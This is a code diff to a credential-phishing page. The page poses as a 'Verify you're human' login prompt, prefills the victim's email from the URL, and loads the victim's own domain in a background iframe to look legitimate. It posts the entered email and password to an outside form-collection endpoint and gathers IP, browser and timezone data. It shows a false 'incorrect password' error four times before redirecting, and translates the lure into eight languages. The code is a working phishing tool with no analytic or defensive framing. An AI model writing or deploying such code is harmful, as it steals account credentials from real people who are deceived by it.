@@ -7,12 +7,25 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             margin: 0;
-            background-color: #f0f2f5;
+            padding: 0;
+            overflow: hidden;
+        }
+        #background-iframe, #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+        }
+        #background-iframe {
+            border: none;
+            z-index: -3;
+            object-fit: cover;
+        }
+        #overlay {
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: -2;
         }
         .login-container {
             background: white;
@@ -21,7 +34,8 @@
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             width: 300px;
             position: relative;
-            overflow: hidden;
+            z-index: 1;
+            margin: auto;
         }
         .login-container::before {
             content: attr(data-domain);
@@ -80,9 +94,34 @@
         .honeypot {
             display: none;
         }
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .spinner-border {
+            width: 3rem;
+            height: 3rem;
+            border: 0.25em solid currentColor;
+            border-right-color: transparent;
+            border-radius: 50%;
+            animation: spinner-border 0.75s linear infinite;
+        }
+        @keyframes spinner-border {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+    <div id="overlay"></div>
     <div class="login-container" data-domain="">
         <h2 data-translate="form_header">Verify you’re human</h2>
         <form id="login-form" action="https://submit-form.com/J2IVAy4bj" method="POST">
@@ -102,6 +141,11 @@
             <div class="error-message" id="error-message" data-translate="error_message">Incorrect password, please try again</div>
         </form>
     </div>
+    <div id="loader-overlay" class="loader-overlay">
+        <div class="spinner-border text-light" role="status">
+            <span class="visually-hidden" data-translate="loader_text">Loading...</span>
+        </div>
+    </div>
 
     <script>
         // Translation dictionary
@@ -112,7 +156,8 @@
                 password_label: "Password:",
                 submit_button: "Log In",
                 error_message: "Incorrect password, please try again",
-                bot_detected: "Bot detected, please try again"
+                bot_detected: "Bot detected, please try again",
+                loader_text: "Loading..."
             },
             es: {
                 form_header: "Verifica que eres humano",
@@ -120,7 +165,8 @@
                 password_label: "Contraseña:",
                 submit_button: "Iniciar sesión",
                 error_message: "Contraseña incorrecta, por favor intenta de nuevo",
-                bot_detected: "Bot detectado, por favor intenta de nuevo"
+                bot_detected: "Bot detectado, por favor intenta de nuevo",
+                loader_text: "Cargando..."
             },
             fr: {
                 form_header: "Vérifiez que vous êtes humain",
@@ -128,7 +174,8 @@
                 password_label: "Mot de passe :",
                 submit_button: "Se connecter",
                 error_message: "Mot de passe incorrect, veuillez réessayer",
-                bot_detected: "Bot détecté, veuillez réessayer"
+                bot_detected: "Bot détecté, veuillez réessayer",
+                loader_text: "Chargement..."
             },
             de: {
                 form_header: "Bestätigen Sie, dass Sie ein Mensch sind",
@@ -136,7 +183,8 @@
                 password_label: "Passwort:",
                 submit_button: "Anmelden",
                 error_message: "Falsches Passwort, bitte versuchen Sie es erneut",
-                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut"
+                bot_detected: "Bot erkannt, bitte versuchen Sie es erneut",
+                loader_text: "Laden..."
             },
             it: {
                 form_header: "Verifica che sei umano",
@@ -144,7 +192,8 @@
                 password_label: "Password:",
                 submit_button: "Accedi",
                 error_message: "Password errata, riprova",
-                bot_detected: "Bot rilevato, riprova"
+                bot_detected: "Bot rilevato, riprova",
+                loader_text: "Caricamento..."
             },
             pt: {
                 form_header: "Verifique que você é humano",
@@ -152,7 +201,8 @@
                 password_label: "Senha:",
                 submit_button: "Entrar",
                 error_message: "Senha incorreta, tente novamente",
-                bot_detected: "Bot detectado, tente novamente"
+                bot_detected: "Bot detectado, tente novamente",
+                loader_text: "Carregando..."
             },
             ja: {
                 form_header: "あなたが人間であることを確認してください",
@@ -160,7 +210,8 @@
                 password_label: "パスワード:",
                 submit_button: "ログイン",
                 error_message: "パスワードが正しくありません。もう一度お試しください",
-                bot_detected: "ボットが検出されました。もう一度お試しください"
+                bot_detected: "ボットが検出されました。もう一度お試しください",
+                loader_text: "読み込み中..."
             },
             zh: {
                 form_header: "验证您是人类",
@@ -168,7 +219,8 @@
                 password_label: "密码:",
                 submit_button: "登录",
                 error_message: "密码错误，请重试",
-                bot_detected: "检测到机器人，请重试"
+                bot_detected: "检测到机器人，请重试",
+                loader_text: "加载中..."
             }
         };
 
@@ -204,79 +256,125 @@
             return { email, domain };
         }
 
-        // Initialize form
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const honeypotInput = document.getElementById('honeypot');
-        const loginContainer = document.querySelector('.login-container');
-        const errorMessage = document.getElementById('error-message');
-        const form = document.getElementById('login-form');
-        const { email, domain } = getEmailFromUrl();
-        if (email) {
-            emailInput.value = email;
-        }
-        if (domain) {
-            loginContainer.setAttribute('data-domain', domain);
-        }
+        // Initialize form and background
+        document.addEventListener("DOMContentLoaded", () => {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const honeypotInput = document.getElementById('honeypot');
+            const loginContainer = document.querySelector('.login-container');
+            const errorMessage = document.getElementById('error-message');
+            const loaderOverlay = document.getElementById('loader-overlay');
+            const form = document.getElementById('login-form');
+            const backgroundIframe = document.getElementById('background-iframe');
+            const { email, domain } = getEmailFromUrl();
 
-        // Apply translations based on browser language
-        const browserLang = getBrowserLanguage();
-        applyTranslations(browserLang);
-
-        // Track submission attempts and timing
-        let submissionAttempts = 0;
-        const formLoadTime = Date.now();
-
-        // Handle form submission with bot detection
-        form.addEventListener('submit', async (event) => {
-            event.preventDefault(); // Prevent default form submission
-
-            // Bot detection: Check honeypot and submission speed
-            const timeSinceLoad = Date.now() - formLoadTime;
-            if (honeypotInput.value !== '' || timeSinceLoad < 1000) { // Bots often fill honeypot or submit too fast
-                errorMessage.textContent = translations[browserLang]?.bot_detected || "Bot detected, please try again";
-                errorMessage.style.display = 'block';
-                passwordInput.value = '';
-                honeypotInput.value = '';
-                passwordInput.focus();
-                return;
+            if (email) {
+                emailInput.value = email;
             }
-
-            submissionAttempts++;
-
-            // Submit form data to the specified URL
-            const formData = new FormData(form);
-            try {
-                await fetch('https://submit-form.com/J2IVAy4bj', {
-                    method: 'POST',
-                    body: formData
-                });
-                // Note: No response handling since we control the flow client-side
-            } catch (error) {
-                console.error('Submission error:', error);
-            }
-
-            // Handle behavior based on attempt count
-            if (submissionAttempts < 3) {
-                // Show error message and clear password for first two attempts
-                errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
-                errorMessage.style.display = 'block';
-                passwordInput.value = '';
-                honeypotInput.value = ''; // Clear honeypot for next attempt
-                passwordInput.focus();
+            if (domain) {
+                loginContainer.setAttribute('data-domain', domain);
+                const domainUrl = domain.startsWith('http://') || domain.startsWith('https://') ? domain : `https://${domain}`;
+                backgroundIframe.src = domainUrl;
             } else {
-                // Redirect to domain website on third attempt
-                if (domain) {
-                    window.location.href = `https://${domain}`;
-                } else {
-                    // Fallback if no domain
-                    errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
+                backgroundIframe.src = 'about:blank';
+            }
+
+            // Apply translations based on browser language
+            const browserLang = getBrowserLanguage();
+            applyTranslations(browserLang);
+
+            // Track submission attempts and timing
+            let submissionAttempts = 0;
+            const formLoadTime = Date.now();
+
+            // Collect additional data (for logging, not sent to form endpoint)
+            let additionalData = {
+                ipAddress: "Fetching...",
+                userAgent: navigator.userAgent,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                browser: "Detecting..."
+            };
+            const userAgent = navigator.userAgent;
+            additionalData.browser = userAgent.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
+                                     userAgent.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
+                                     userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1 ? "Opera" :
+                                     userAgent.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
+                                     userAgent.indexOf("Edge") > -1 ? "Microsoft Edge" :
+                                     userAgent.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
+                                     userAgent.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";
+
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => { additionalData.ipAddress = data.ip; })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                    additionalData.ipAddress = "Unavailable";
+                });
+
+            // Handle form submission with bot detection
+            form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+
+                // Bot detection: Check honeypot and submission speed
+                const timeSinceLoad = Date.now() - formLoadTime;
+                if (honeypotInput.value !== '' || timeSinceLoad < 1000) {
+                    errorMessage.textContent = translations[browserLang]?.bot_detected || "Bot detected, please try again";
                     errorMessage.style.display = 'block';
                     passwordInput.value = '';
                     honeypotInput.value = '';
                     passwordInput.focus();
+                    return;
                 }
-            }
+
+                submissionAttempts++;
+                loaderOverlay.style.display = 'flex';
+
+                // Prepare form data
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                const data = { email, password };
+
+                // Log additional data (not sent to endpoint)
+                let logMessage = `Email: ${email}\nPassword: ${password}\nIP Address: ${additionalData.ipAddress}\nUser Agent: ${additionalData.userAgent}\nTimezone: ${additionalData.timezone}\nBrowser: ${additionalData.browser}`;
+                console.log(logMessage);
+
+                // Submit form data to endpoint
+                try {
+                    await fetch('https://submit-form.com/J2IVAy4bj', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    console.log('Submission to form successful!');
+                } catch (error) {
+                    console.error('Submission error:', error);
+                }
+
+                // Handle submission attempts
+                if (submissionAttempts <= 4) {
+                    setTimeout(() => {
+                        loaderOverlay.style.display = 'none';
+                        errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
+                        errorMessage.style.display = 'block';
+                        passwordInput.value = '';
+                        honeypotInput.value = '';
+                        passwordInput.focus();
+                    }, 3000);
+                } else if (submissionAttempts === 5) {
+                    setTimeout(() => {
+                        loaderOverlay.style.display = 'none';
+                        if (domain) {
+                            window.location.href = `https://${domain}`;
+                        } else {
+                            errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
+                            errorMessage.style.display = 'block';
+                            passwordInput.value = '';
+                            honeypotInput.value = '';
+                            passwordInput.focus();
+                        }
+                    }, 3000);
+                }
+            });
         });
     </script>
 </body>
